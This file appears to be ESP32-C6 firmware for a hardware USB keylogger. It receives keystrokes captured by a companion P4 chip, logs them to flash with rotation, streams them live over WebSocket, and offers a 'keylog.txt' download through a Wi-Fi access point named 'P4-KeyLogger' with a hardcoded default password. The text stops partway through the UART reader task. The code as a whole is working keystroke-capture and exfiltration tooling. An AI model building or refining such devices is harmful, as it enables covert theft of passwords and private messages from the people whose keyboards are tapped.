// ESP32-C6 firmware for the keylogger web UI (v2 boot rearchitecture).
//
// - Wi-Fi soft AP "P4-KeyLogger" / "changeme123"
// - Web UI at http://192.168.4.1
//   * live WebSocket stream (keys + kbd/mouse status)
//   * download / delete log, start/stop recording, auto-download toggle
// - SPIFFS at /data — log.txt (current) rotates to log.old.txt at 1.5 MB
// - UART1 RX on GPIO4 reads a line-based framed stream from the P4:
//     KEY <text>\n
//     EVT KBD_CONNECT | KBD_DISCONNECT | MOUSE_CONNECT | MOUSE_DISCONNECT\n
//     RAW <hex bytes>\n
// - Settings persisted in NVS (recording on/off, auto-download on/off, LED mode)
// - NVS boot-trace: a phase marker written on every boot so a crash can be
//   reconstructed later from the flash contents, even without a console.
//
// Boot/LED architecture (v2):
//   v1 ran the whole wifi bring-up on app_main's 3.5KB stack; esp_wifi_init/
//   start nests deep enough to overflow it and kill the app seconds into
//   boot, and every wifi error was *ignored* (it always logged "AP up").
//   v2 moves all wifi work into a dedicated task, and makes the C6 LED the
//   one trustworthy live channel via SDIO scratch reg 40, owned by a small
//   task:
//     GREEN   = SDIO slave up, booting
//     BLUE    = Wi-Fi AP confirmed up (few seconds, then saved LED mode)
//     RED     = something locked in failure (SDIO down, wifi down) — stays
//               red, never silently returns to the user mode
//   The saved LED mode is ONLY applied after a CONFIRMED wifi success.

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

#include "esp_log.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_http_server.h"
#include "esp_spiffs.h"
#include "esp_heap_caps.h"
#include "nvs.h"
#include "nvs_flash.h"
#include "driver/uart.h"
#include "driver/gpio.h"
#include "driver/sdio_slave.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/ringbuf.h"

static const char *TAG = "c6ui";

// ----------------------------- config ---------------------------------
#define AP_SSID       "P4-KeyLogger"
#define AP_PASS       "changeme123"
#define AP_CHANNEL    6
#define AP_MAX_STA    4

#define P4_UART_NUM   UART_NUM_1
#define P4_UART_RX    GPIO_NUM_4
#define P4_UART_BAUD  115200

#define MAX_WS_CLIENTS   4
#define LIVE_RING_BYTES  16384

#define LOG_MOUNT        "/data"
#define LOG_CURRENT_PATH "/data/log.txt"
#define LOG_OLD_PATH     "/data/log.old.txt"
#define LOG_MAX_BYTES    (1500 * 1024)     // rotate at 1.5 MB
#define LOG_WARN_BYTES   (1350 * 1024)     // trigger auto-download at 90%

#define NVS_NS           "kl"
#define NVS_K_REC        "rec"
#define NVS_K_AUTODL     "adl"
#define NVS_K_LEDMODE    "ledm"
#define NVS_K_BOOTTR     "boottr"

// LED modes must match firmware/main/led.h
#define LED_MODE_OFF       0
#define LED_MODE_GREEN     1
#define LED_MODE_KEYFLASH  2
#define LED_MODE_RED       3
#define LED_MODE_BLUE      4

// SDIO scratch register position that the P4 polls. Range 0..27 or 32..63
// (28..31 are the interrupt registers).
#define SDIO_REG_LED_MODE  40

// NVS boot-trace phases (kept in NVS_K_BOOTTR, surfaced in /status).
#define BOOT_PHASE_BOOT      1
#define BOOT_PHASE_SDIO_UP   2
#define BOOT_PHASE_WIFI_OK   3
#define BOOT_PHASE_WIFI_FAIL 4
#define BOOT_PHASE_RUNNING   5

// --------------------------- state ------------------------------------
extern const char WEB_UI_HTML[];
extern const int  WEB_UI_HTML_LEN;

static httpd_handle_t s_http;
static int s_ws_fds[MAX_WS_CLIENTS];
static SemaphoreHandle_t s_ws_lock;
static RingbufHandle_t   s_live_ring;

static SemaphoreHandle_t s_log_lock;
static bool s_recording   = true;
static bool s_auto_dl     = false;
static bool s_kbd_present = false;
static bool s_mouse_present = false;
static bool s_warned_pending_dl = false;
static uint32_t s_sta_count = 0;
static uint8_t  s_led_mode = LED_MODE_KEYFLASH;   // saved USER mode (also wire target)
static volatile uint8_t s_led_disp = LED_MODE_KEYFLASH; // what's currently on reg 40
static SemaphoreHandle_t s_led_lock;
static volatile int  s_bootphase = 0;
static volatile int  s_wifi_up   = -1;   // -1 pending, 1 = AP confirmed, 0 = failed
static uint32_t s_uart_bytes_total = 0;
static uint32_t s_sdio_bytes_total = 0;
static uint32_t s_publish_calls    = 0;   // how many times publish() was entered
static uint32_t s_ws_broadcast_calls = 0; // ws_broadcast entries (all frames)
static uint32_t s_ws_gated_off     = 0;   // dropped because live-streaming was off
static uint32_t s_ws_no_clients    = 0;   // no WS fd in the table
static uint32_t s_ws_queue_fail    = 0;   // httpd_queue_work returned non-OK
static uint32_t s_ws_frames_sent   = 0;   // successfully queued
static bool     s_live_streaming   = false;   // off by default per user request
static int      s_client_count     = 0;   // how many WS fds populated (from ws_broadcast_ex snapshot)

#define SDIO_RX_BUFSZ 512
#define SDIO_RX_NBUF  8

// --------------------------- helpers ----------------------------------
static void nvs_load_settings(void) {
    nvs_handle_t h;
    if (nvs_open(NVS_NS, NVS_READONLY, &h) != ESP_OK) return;
    uint8_t v = 0;
    if (nvs_get_u8(h, NVS_K_REC,     &v) == ESP_OK) s_recording = v ? true : false;
    if (nvs_get_u8(h, NVS_K_AUTODL,  &v) == ESP_OK) s_auto_dl   = v ? true : false;
    if (nvs_get_u8(h, NVS_K_LEDMODE, &v) == ESP_OK) s_led_mode  = v > LED_MODE_BLUE ? LED_MODE_KEYFLASH : v;
    nvs_close(h);
}
static void nvs_save_settings(void) {
    nvs_handle_t h;
    if (nvs_open(NVS_NS, NVS_READWRITE, &h) != ESP_OK) return;
    nvs_set_u8(h, NVS_K_REC,     s_recording ? 1 : 0);
    nvs_set_u8(h, NVS_K_AUTODL,  s_auto_dl   ? 1 : 0);
    nvs_set_u8(h, NVS_K_LEDMODE, s_led_mode);
    nvs_commit(h);
    nvs_close(h);
}

// One-byte NVS boot trace. Cheap (single u8/commit) and survives crashes, so
// even with no console the flash itself shows which boot stage was reached last.
static void boot_trace(uint8_t phase) {
    s_bootphase = phase;
    nvs_handle_t h;
    if (nvs_open(NVS_NS, NVS_READWRITE, &h) != ESP_OK) return;
    nvs_set_u8(h, NVS_K_BOOTTR, phase);
    nvs_commit(h);
    nvs_close(h);
}

// -------------------- LED ownership (SDIO wire) -----------------------
// The wire register (reg 40) is OWned by the LED functions below and
// re-asserted by a dedicated task, so a transition can never be lost or
// half-applied. The C6 LED mirrors reg 40 on the P4 every 500 ms; the C6
// heartbeat re-writes the CURRENT display value on change.
static void led_write_reg(uint8_t m) {
    esp_err_t err = sdio_slave_write_reg(SDIO_REG_LED_MODE, m);
    if (err != ESP_OK) ESP_LOGW(TAG, "led reg write: %s", esp_err_to_name(err));
}
// Telemetry/phase: BLUE/GREEN/RED for boot stages (never the saved mode).
static void led_phase(uint8_t m) {
    xSemaphoreTake(s_led_lock, portMAX_DELAY);
    s_led_disp = m;
    xSemaphoreGive(s_led_lock);
    led_write_reg(m);
}
// Adopt the user's saved mode (web /led endpoint or post-blue handover).
static void led_user_mode(uint8_t m) {
    xSemaphoreTake(s_led_lock, portMAX_DELAY);
    s_led_mode = m;
    s_led_disp = m;
    xSemaphoreGive(s_led_lock);
    led_write_reg(m);
    nvs_save_settings();
}
// Heartbeat owner task: keeps reg 40 in sync with the current display value.
static void led_task(void *arg) {
    (void)arg;
    uint8_t last = 0xFF;
    while (1) {
        uint8_t m;
        xSemaphoreTake(s_led_lock, portMAX_DELAY);
        m = s_led_disp;
        xSemaphoreGive(s_led_lock);
        if (m != last) { led_write_reg(m); last = m; }
        vTaskDelay(pdMS_TO_TICKS(500));
    }
}

static size_t file_size(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 ? (size_t)st.st_size : 0;
}
static size_t log_total_bytes(void) {
    return file_size(LOG_CURRENT_PATH) + file_size(LOG_OLD_PATH);
}

// ------------------------- WebSocket bookkeeping ---------------------
static void ws_add(int fd) {
    xSemaphoreTake(s_ws_lock, portMAX_DELAY);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) if (s_ws_fds[i] == 0) { s_ws_fds[i] = fd; break; }
    xSemaphoreGive(s_ws_lock);
}
static void ws_drop(int fd) {
    xSemaphoreTake(s_ws_lock, portMAX_DELAY);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) if (s_ws_fds[i] == fd) s_ws_fds[i] = 0;
    xSemaphoreGive(s_ws_lock);
}
// httpd_ws_send_frame_async is asynchronous — the payload MUST stay valid until
// the httpd worker actually sends it. Passing stack pointers straight to it is
// a use-after-free (that's why the live view was blank). We instead schedule a
// work item on the httpd thread with a heap copy that the worker frees.
typedef struct {
    httpd_handle_t hd;
    int            fd;
    size_t         len;
    uint8_t        data[];        // flexible: full frame payload
} ws_send_work_t;

static void ws_send_work_cb(void *arg) {
    ws_send_work_t *w = arg;
    httpd_ws_frame_t f = {
        .final = true, .fragmented = false, .type = HTTPD_WS_TYPE_TEXT,
        .payload = w->data, .len = w->len,
    };
    esp_err_t err = httpd_ws_send_frame_async(w->hd, w->fd, &f);
    // Only drop on HARD errors — socket closed / invalid arg. Transient
    // errors (send-buffer full, timeout) mean "try again later", not "the
    // client is gone". Dropping too eagerly was silently killing WS clients
    // during typing bursts.
    if (err == ESP_ERR_INVALID_ARG || err == ESP_ERR_INVALID_STATE ||
        err == ESP_ERR_NOT_FOUND) {
        ws_drop(w->fd);
    }
    free(w);
}

// Use httpd's own client tracking (manual s_ws_fds bookkeeping was going
// empty and losing frames). We keep the ws_send_work_t heap alloc: it's per-
// worker, freed as soon as the send completes, and the payload copy is
// necessary because the caller's buffer isn't guaranteed to outlive the
// async send. A pool would help under sustained typing but the mallocs stay
// bounded at (n WS clients) simultaneous in-flight.
static void ws_broadcast_ex(const char *data, size_t len) {
    s_ws_broadcast_calls++;
    if (!s_http || !len) return;
    int fds[16];
    size_t n_fds = 16;
    if (httpd_get_client_list(s_http, &n_fds, fds) != ESP_OK) { s_ws_queue_fail++; return; }
    int ws_clients = 0;
    for (size_t i = 0; i < n_fds; i++) {
        if (httpd_ws_get_fd_info(s_http, fds[i]) == HTTPD_WS_CLIENT_WEBSOCKET) ws_clients++;
    }
    s_client_count = ws_clients;
    if (ws_clients == 0) { s_ws_no_clients++; return; }
    for (size_t i = 0; i < n_fds; i++) {
        if (httpd_ws_get_fd_info(s_http, fds[i]) != HTTPD_WS_CLIENT_WEBSOCKET) continue;
        ws_send_work_t *w = malloc(sizeof(*w) + len);
        if (!w) continue;
        w->hd = s_http; w->fd = fds[i]; w->len = len;
        memcpy(w->data, data, len);
        if (httpd_queue_work(s_http, ws_send_work_cb, w) != ESP_OK) {
            free(w); s_ws_queue_fail++; continue;
        }
        s_ws_frames_sent++;
    }
}
static inline void ws_broadcast(const char *data, size_t len) { ws_broadcast_ex(data, len); }
static inline void ws_broadcast_str(const char *s)            { ws_broadcast_ex(s, strlen(s)); }

// --------------------- log write + rotate -----------------------------
static void log_write(const char *line, size_t n) {
    if (!s_recording) return;
    xSemaphoreTake(s_log_lock, portMAX_DELAY);

    size_t cur = file_size(LOG_CURRENT_PATH);
    if (cur + n > LOG_MAX_BYTES) {
        // Rotate: delete old, rename current -> old.
        // Delete old BEFORE writing new so we can never exceed 2 * LOG_MAX_BYTES.
        unlink(LOG_OLD_PATH);
        rename(LOG_CURRENT_PATH, LOG_OLD_PATH);
        cur = 0;
        s_warned_pending_dl = false;
    }
    FILE *f = fopen(LOG_CURRENT_PATH, "ab");
    if (f) { fwrite(line, 1, n, f); fclose(f); }

    // Warn at 90% so auto-download client has time to fetch before rotate.
    size_t total = file_size(LOG_CURRENT_PATH) + file_size(LOG_OLD_PATH);
    bool warn = total > LOG_WARN_BYTES && !s_warned_pending_dl;
    xSemaphoreGive(s_log_lock);

    if (warn) {
        s_warned_pending_dl = true;
        // Send an out-of-band control message the JS client watches for.
        // "\x1e" is a hex escape — "CTL" must be pasted as a separate string
        // or "C" gets eaten as a hex digit and the prefix byte is corrupted.
        ws_broadcast_str("\x1e" "CTL autodownload\n");
    }
}
static void log_delete_all(void) {
    xSemaphoreTake(s_log_lock, portMAX_DELAY);
    unlink(LOG_CURRENT_PATH);
    unlink(LOG_OLD_PATH);
    s_warned_pending_dl = false;
    xSemaphoreGive(s_log_lock);
}

// Turn a wire frame ("KEY a\n", "KEY [LALT + 6]\n", "EVT KBD_CONNECT\n") into
// clean log text ("a", "[LALT + 6]", "(KBD_CONNECT)\n") — no "KEY " prefix
// and no artificial newline between characters.
static size_t frame_to_log(const char *in, char *out, size_t out_sz) {
    size_t n = strlen(in);
    if (n && in[n-1] == '\n') n--;
    if (!strncmp(in, "KEY ", 4)) {
        const char *body = in + 4;
        size_t bl = n - 4;
        // Real Enter comes over the wire as the two chars '\\' + 'n'
        if (bl == 2 && body[0] == '\\' && body[1] == 'n') {
            if (out_sz < 2) return 0;
            out[0] = '\n'; return 1;
        }
        if (bl > out_sz - 1) bl = out_sz - 1;
        memcpy(out, body, bl);
        return bl;
    }
    if (!strncmp(in, "EVT ", 4)) {
        int m = snprintf(out, out_sz, "\n<%.*s>\n", (int)(n - 4), in + 4);
        return m > 0 ? (size_t)m : 0;
    }
    if (n > out_sz - 1) n = out_sz - 1;
    memcpy(out, in, n);
    return n;
}

// All C6-generated frames go through here: WS gets the framed line unchanged
// so the browser can distinguish frame types; the log file gets the cleaned
// text produced by frame_to_log(). Diagnostic EVTs like ENUM_RETRY are shown
// live but skipped from the persistent log so they don't push out real
// keystrokes at rotation time.
static bool is_diagnostic_evt(const char *line) {
    if (strncmp(line, "EVT ", 4)) return false;
    const char *b = line + 4;
    return !strncmp(b, "ENUM_RETRY",  10)
        || !strncmp(b, "ENUM_OK",      7)
        || !strncmp(b, "ENUM_FAIL",    9)
        || !strncmp(b, "P4_READY",     8)
        || !strncmp(b, "P4_ALIVE",     8);
}

static void publish(const char *line) {
    size_t n = strlen(line);
    if (!n) return;
    s_publish_calls++;
    xRingbufferSend(s_live_ring, line, n, 0);
    bool is_key = !strncmp(line, "KEY ", 4);
    if (!(is_key && !s_live_streaming)) {
        ws_broadcast(line, n);
    } else {
        s_ws_gated_off++;
    }
    if (is_diagnostic_evt(line)) return;   // keep the log clean
    char clean[512];
    size_t cl = frame_to_log(line, clean, sizeof(clean));
    if (cl) log_write(clean, cl);
}

// ------------------------- HTTP handlers ------------------------------
static esp_err_t h_root(httpd_req_t *r) {
    httpd_resp_set_type(r, "text/html; charset=utf-8");
    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
    return httpd_resp_send(r, WEB_UI_HTML, WEB_UI_HTML_LEN);
}

static esp_err_t h_ws(httpd_req_t *r) {
    if (r->method == HTTP_GET) {
        int fd = httpd_req_to_sockfd(r);
        ws_add(fd);
        // On-connect priming: hello STATUS + recent live-ring backfill. Use
        // the SYNC variant inside the request handler; async here is racy.
        char hello[128];
        int n = snprintf(hello, sizeof(hello),
            "\x1eSTATUS kbd=%d mouse=%d rec=%d adl=%d\n",
            s_kbd_present, s_mouse_present, s_recording, s_auto_dl);
        httpd_ws_frame_t hf = { .final=true, .type=HTTPD_WS_TYPE_TEXT,
                                .payload=(uint8_t*)hello, .len=n };
        httpd_ws_send_frame(r, &hf);

        size_t item_sz = 0;
        char *item = (char *)xRingbufferReceiveUpTo(s_live_ring, &item_sz, 0, 2048);
        if (item && item_sz) {
            httpd_ws_frame_t f = { .final=true, .type=HTTPD_WS_TYPE_TEXT,
                                   .payload=(uint8_t*)item, .len=item_sz };
            httpd_ws_send_frame(r, &f);
        }
        if (item) vRingbufferReturnItem(s_live_ring, item);
        return ESP_OK;
    }
    httpd_ws_frame_t f = { 0 };
    uint8_t buf[128]; f.payload = buf;
    if (httpd_ws_recv_frame(r, &f, sizeof(buf)) != ESP_OK) ws_drop(httpd_req_to_sockfd(r));
    return ESP_OK;
}

static esp_err_t h_status(httpd_req_t *r) {
    char body[512];
    size_t used = log_total_bytes();
    int n = snprintf(body, sizeof(body),
        "{\"chip\":\"esp32c6\",\"ssid\":\"%s\",\"kbd\":%s,\"mouse\":%s,"
         "\"recording\":%s,\"live\":%s,\"autoDownload\":%s,"
         "\"logBytes\":%u,\"logMax\":%u,\"warnBytes\":%u,"
         "\"clients\":%u,\"uartRxBytes\":%u,\"sdioRxBytes\":%u,"
         "\"wsFrames\":%u,\"pub\":%u,\"wsCalls\":%u,\"wsGated\":%u,"
         "\"wsNoClient\":%u,\"wsQueueFail\":%u,\"wsFds\":%u,\"ledMode\":%d,"
         "\"wifi\":%d,\"bootphase\":%d}",
        AP_SSID, s_kbd_present?"true":"false", s_mouse_present?"true":"false",
        s_recording?"true":"false", s_live_streaming?"true":"false", s_auto_dl?"true":"false",
        (unsigned)used, (unsigned)LOG_MAX_BYTES, (unsigned)LOG_WARN_BYTES,
        (unsigned)s_sta_count, (unsigned)s_uart_bytes_total,
        (unsigned)s_sdio_bytes_total, (unsigned)s_ws_frames_sent,
        (unsigned)s_publish_calls, (unsigned)s_ws_broadcast_calls,
        (unsigned)s_ws_gated_off, (unsigned)s_ws_no_clients,
        (unsigned)s_ws_queue_fail, (unsigned)s_client_count,
        (int)s_led_mode, (int)s_wifi_up, (int)s_bootphase);
    httpd_resp_set_type(r, "application/json");
    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
    return httpd_resp_send(r, body, n);
}

static esp_err_t h_download(httpd_req_t *r) {
    httpd_resp_set_type(r, "text/plain; charset=utf-8");
    httpd_resp_set_hdr(r, "Content-Disposition", "attachment; filename=\"keylog.txt\"");
    httpd_resp_set_hdr(r, "Cache-Control", "no-store");

    xSemaphoreTake(s_log_lock, portMAX_DELAY);
    // Emit old first, then current, so the file reads oldest→newest.
    const char *paths[2] = { LOG_OLD_PATH, LOG_CURRENT_PATH };
    char buf[1024];
    for (int i = 0; i < 2; i++) {
        FILE *f = fopen(paths[i], "rb");
        if (!f) continue;
        size_t n;
        while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
            if (httpd_resp_send_chunk(r, buf, n) != ESP_OK) { fclose(f); goto done; }
        }
        fclose(f);
    }
done:
    xSemaphoreGive(s_log_lock);
    httpd_resp_send_chunk(r, NULL, 0);
    return ESP_OK;
}

static esp_err_t h_log_delete(httpd_req_t *r) {
    log_delete_all();
    publish("EVT LOG_CLEARED\n");
    httpd_resp_set_type(r, "application/json");
    return httpd_resp_sendstr(r, "{\"ok\":true}");
}

static esp_err_t h_rec_start(httpd_req_t *r) {
    s_recording = true; nvs_save_settings();
    publish("EVT REC_START\n");
    httpd_resp_set_type(r, "application/json");
    return httpd_resp_sendstr(r, "{\"recording\":true}");
}
static esp_err_t h_rec_stop(httpd_req_t *r) {
    s_recording = false; nvs_save_settings();
    // Publish AFTER the flag flip so we still see it on the live wire, but it
    // won't be persisted since s_recording is false now.
    ws_broadcast_str("EVT REC_STOP\n");
    httpd_resp_set_type(r, "application/json");
    return httpd_resp_sendstr(r, "{\"recording\":false}");
}
static esp_err_t h_live_start(httpd_req_t *r) {
    s_live_streaming = true;
    ws_broadcast_str("EVT LIVE_START\n");
    httpd_resp_set_type(r, "application/json");
    return httpd_resp_sendstr(r, "{\"live\":true}");
}
static esp_err_t h_live_stop(httpd_req_t *r) {
    ws_broadcast_str("EVT LIVE_STOP\n");
    s_live_streaming = false;
    httpd_resp_set_type(r, "application/json");
    return httpd_resp_sendstr(r, "{\"live\":false}");
}

static esp_err_t h_led_set(httpd_req_t *r) {
    char q[32] = { 0 };
    httpd_req_get_url_query_str(r, q, sizeof(q));
    char v[8] = { 0 };
    httpd_query_key_value(q, "m", v, sizeof(v));
    int m = atoi(v);
    if (m < 0 || m > LED_MODE_BLUE) m = LED_MODE_KEYFLASH;
    led_user_mode((uint8_t)m);        // persist + apply + put on the wire now
    httpd_resp_set_type(r, "application/json");
    char body[32]; int n = snprintf(body, sizeof(body), "{\"ledMode\":%d}", (int)s_led_mode);
    return httpd_resp_send(r, body, n);
}

static esp_err_t h_autodl_set(httpd_req_t *r) {
    char q[32] = { 0 };
    httpd_req_get_url_query_str(r, q, sizeof(q));
    char v[8] = { 0 };
    httpd_query_key_value(q, "v", v, sizeof(v));
    s_auto_dl = (v[0] == '1');
    nvs_save_settings();
    httpd_resp_set_type(r, "application/json");
    char body[48];
    int n = snprintf(body, sizeof(body), "{\"autoDownload\":%s}", s_auto_dl?"true":"false");
    return httpd_resp_send(r, body, n);
}

// ------------------------- Wi-Fi AP (own task) ------------------------
// v1 ran ALL of this on app_main's stack and IGNORED every return value,
// so a wifi failure was invisible yet always logged "AP up". Here it is a
// dedicated task with a big stack; the outcome drives the LED and the
// /status "wifi" field.
static volatile bool s_ap_ready = false;

static void wifi_event(void *arg, esp_event_base_t base, int32_t id, void *data) {
    (void)arg; (void)data;
    if (base != WIFI_EVENT) return;
    if (id == WIFI_EVENT_AP_START)         { s_ap_ready = true; s_wifi_up = 1; ESP_LOGI(TAG, "WIFI_EVENT_AP_START"); }
    else if (id == WIFI_EVENT_AP_STOP)     { s_ap_ready = false; ESP_LOGW(TAG, "WIFI_EVENT_AP_STOP"); }
    else if (id == WIFI_EVENT_AP_STACONNECTED)    { s_sta_count++; ESP_LOGI(TAG, "STA+"); }
    else if (id == WIFI_EVENT_AP_STADISCONNECTED) { if (s_sta_count) s_sta_count--; ESP_LOGI(TAG, "STA-"); }
}

static void wifi_task(void *arg) {
    (void)arg;
    esp_err_t err;

    err = esp_netif_init();
    if (err != ESP_OK) { ESP_LOGE(TAG, "esp_netif_init: %s", esp_err_to_name(err)); goto wifi_failed; }
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "esp_event_loop_create_default: %s", esp_err_to_name(err)); goto wifi_failed;
    }
    if (!esp_netif_create_default_wifi_ap()) {
        ESP_LOGE(TAG, "esp_netif_create_default_wifi_ap failed"); goto wifi_failed;
    }

    wifi_init_config_t init = WIFI_INIT_CONFIG_DEFAULT();
    err = esp_wifi_init(&init);
    if (err != ESP_OK) { ESP_LOGE(TAG, "esp_wifi_init: %s", esp_err_to_name(err)); goto wifi_failed; }
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, wifi_event, NULL, NULL);

    wifi_config_t ap = { 0 };
    strncpy((char *)ap.ap.ssid, AP_SSID, sizeof(ap.ap.ssid) - 1);
    ap.ap.ssid_len = (uint8_t)strlen(AP_SSID);
    strncpy((char *)ap.ap.password, AP_PASS, sizeof(ap.ap.password) - 1);
    ap.ap.channel = AP_CHANNEL;
    ap.ap.max_connection = AP_MAX_STA;
    ap.ap.authmode = WIFI_AUTH_WPA2_PSK;

    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) { ESP_LOGE(TAG, "esp_wifi_set_mode: %s", esp_err_to_name(err)); goto wifi_failed; }
    err = esp_wifi_set_config(WIFI_IF_AP, &ap);
    if (err != ESP_OK) { ESP_LOGE(TAG, "esp_wifi_set_config: %s", esp_err_to_name(err)); goto wifi_failed; }

    // Bounded start with retries: a transient RF/PHY blip shouldn't be a
    // one-shot death (and in v1 the error was ignored entirely).
    err = ESP_FAIL;
    for (int attempt = 1; attempt <= 3; attempt++) {
        err = esp_wifi_start();
        if (err == ESP_OK) break;
        ESP_LOGE(TAG, "esp_wifi_start #%d: %s", attempt, esp_err_to_name(err));
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if (err != ESP_OK) goto wifi_failed;

    // esp_wifi_start() returning OK does not prove the radio is broadcasting;
    // wait for the driver's WIFI_EVENT_AP_START to confirm.
    for (int i = 0; i < 40 && !s_ap_ready; i++) vTaskDelay(pdMS_TO_TICKS(50));
    if (!s_ap_ready) {
        ESP_LOGW(TAG, "esp_wifi_start()=OK but AP_START never fired");
        goto wifi_failed;
    }

    s_wifi_up = 1;
    ESP_LOGI(TAG, "AP \"%s\" up on channel %d", AP_SSID, AP_CHANNEL);
    boot_trace(BOOT_PHASE_WIFI_OK);
    led_phase(LED_MODE_BLUE);
    vTaskDelay(pdMS_TO_TICKS(4000));     // visible "everything is fine" beat
    led_user_mode(s_led_mode);           // hand the wire back to the saved mode
    vTaskDelete(NULL);

wifi_failed:
    s_wifi_up = 0;
    boot_trace(BOOT_PHASE_WIFI_FAIL);
    led_phase(LED_MODE_RED);             // stays red — the AP is genuinely down
    ESP_LOGE(TAG, "Wi-Fi AP NOT up");
    vTaskDelete(NULL);
}

static esp_err_t http_up(void) {
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.max_uri_handlers = 16;
    cfg.recv_wait_timeout = 5;
    cfg.send_wait_timeout = 10;
    cfg.stack_size = 8192;
    // Keep the WS connection alive: without this the JS's /status poll every
    // 3 s and any HTTP handler opens fresh sockets that push the WS out of
    // the LRU cache. Result: WS drops within seconds and live view goes dark
    // even though publish() is being called (see WS noClient counter).
    cfg.max_open_sockets = 13;         // room for 1 WS + several transient GETs
    cfg.lru_purge_enable = true;       // recycle the least-recent non-WS socket
    cfg.keep_alive_enable = true;
    cfg.keep_alive_idle = 5;
    cfg.keep_alive_interval = 5;
    cfg.keep_alive_count = 3;
    if (httpd_start(&s_http, &cfg) != ESP_OK) return ESP_FAIL;
    httpd_uri_t routes[] = {
        {"/",              HTTP_GET,  h_root,       NULL, false, false, NULL},
        {"/ws",            HTTP_GET,  h_ws,         NULL, true,  false, NULL},
        {"/status",        HTTP_GET,  h_status,     NULL, false, false, NULL},
        {"/log/download",  HTTP_GET,  h_download,   NULL, false, false, NULL},
        {"/log/delete",    HTTP_POST, h_log_delete, NULL, false, false, NULL},
        {"/rec/start",     HTTP_POST, h_rec_start,  NULL, false, false, NULL},
        {"/rec/stop",      HTTP_POST, h_rec_stop,   NULL, false, false, NULL},
        {"/live/start",    HTTP_POST, h_live_start, NULL, false, false, NULL},
        {"/live/stop",     HTTP_POST, h_live_stop,  NULL, false, false, NULL},
        {"/led",           HTTP_POST, h_led_set,    NULL, false, false, NULL},
        {"/autodl",        HTTP_POST, h_autodl_set, NULL, false, false, NULL},
    };
    for (unsigned i = 0; i < sizeof(routes)/sizeof(routes[0]); i++)
        httpd_register_uri_handler(s_http, &routes[i]);
    ESP_LOGI(TAG, "HTTP up on port 80");
    return ESP_OK;
}

// ------------------------- storage ------------------------------------
static esp_err_t storage_up(void) {
    esp_vfs_spiffs_conf_t cfg = {
        .base_path = LOG_MOUNT,
        .partition_label = "storage",
        .max_files = 4,
        .format_if_mount_failed = true,
    };
    esp_err_t err = esp_vfs_spiffs_register(&cfg);
    if (err != ESP_OK) { ESP_LOGE(TAG, "spiffs: %s", esp_err_to_name(err)); return err; }
    size_t total = 0, used = 0;
    esp_spiffs_info("storage", &total, &used);
    ESP_LOGI(TAG, "SPIFFS %u/%u bytes used", (unsigned)used, (unsigned)total);
    return ESP_OK;
}

// ------------------------- SDIO slave (P4 → C6) -----------------------
// Set up SDIO slave on the fixed C6 pins (CLK=19 CMD=18 D0..D3=20..23).
// The P4 pushes newline-terminated text packets; we split on '\n' and
// funnel them through publish() so they show up in the web UI and log.

static void sdio_rx_task(void *arg) {
    (void)arg;
    char line[512]; int li = 0;
    while (1) {
        uint8_t *rx = NULL; size_t rx_len = 0;
        sdio_slave_buf_handle_t h = NULL;
        esp_err_t err = sdio_slave_recv(&h, &rx, &rx_len, portMAX_DELAY);
        if (err != ESP_OK) { vTaskDelay(pdMS_TO_TICKS(10)); continue; }
        if (rx && rx_len) {
            s_sdio_bytes_total += rx_len;
            for (size_t i = 0; i < rx_len; i++) {
                uint8_t c = rx[i];
                if (c == 0) continue;   // padding
                if (c == '\r') continue;
                if (c == '\n') {
                    if (li == 0) continue;
                    line[li++] = '\n'; line[li] = 0;
                    if      (!strncmp(line, "EVT KBD_CONNECT",    15)) s_kbd_present   = true;
                    else if (!strncmp(line, "EVT KBD_DISCONNECT", 18)) s_kbd_present   = false;
                    else if (!strncmp(line, "EVT MOUSE_CONNECT",  17)) s_mouse_present = true;
                    else if (!strncmp(line, "EVT MOUSE_DISCONNECT",20)) s_mouse_present = false;
                    publish(line);
                    li = 0;
                } else if (li < (int)sizeof(line) - 2) {
                    line[li++] = (char)c;
                } else {
                    line[li] = 0; publish(line); li = 0;
                }
            }
        }
        if (h) sdio_slave_recv_load_buf(h);
    }
}

static esp_err_t sdio_slave_up(void) {
    sdio_slave_config_t cfg = {
        .sending_mode      = SDIO_SLAVE_SEND_STREAM,
        .send_queue_size   = 4,
        .recv_buffer_size  = SDIO_RX_BUFSZ,
    };
    esp_err_t err = sdio_slave_initialize(&cfg);
    if (err != ESP_OK) { ESP_LOGE(TAG, "sdio_slave_init: %s", esp_err_to_name(err)); return err; }
    for (int i = 0; i < SDIO_RX_NBUF; i++) {
        uint8_t *b = heap_caps_malloc(SDIO_RX_BUFSZ, MALLOC_CAP_DMA);
        if (!b) { ESP_LOGE(TAG, "sdio dma buf alloc failed"); return ESP_ERR_NO_MEM; }
        sdio_slave_buf_handle_t h = sdio_slave_recv_register_buf(b);
        if (!h) { ESP_LOGE(TAG, "sdio buf register failed"); return ESP_FAIL; }
        sdio_slave_recv_load_buf(h);
    }
    err = sdio_slave_start();
    if (err != ESP_OK) { ESP_LOGE(TAG, "sdio_slave_start: %s", esp_err_to_name(err)); return err; }
    xTaskCreate(sdio_rx_task, "sdio_rx", 4096, NULL, 5, NULL);
    ESP_LOGI(TAG, "SDIO slave up on default pins (CLK=19 CMD=18 D0..D3=20..23)");
    return ESP_OK;
}

// ------------------------- UART reader (P4 → C6) ----------------------
// Reads line-based frames; each line is a single logical record.
// This lets us treat KEY / EVT / RAW uniformly and update UI state on EVT
// without corrupting keystroke bytes if they contain the substring "EVT".
static void uart_task(void *arg) {
    (void)arg;
    uart_config_t cfg = {
        .baud_rate = P4_UART_BAUD, .data_bits = UART_DATA_8_BITS,
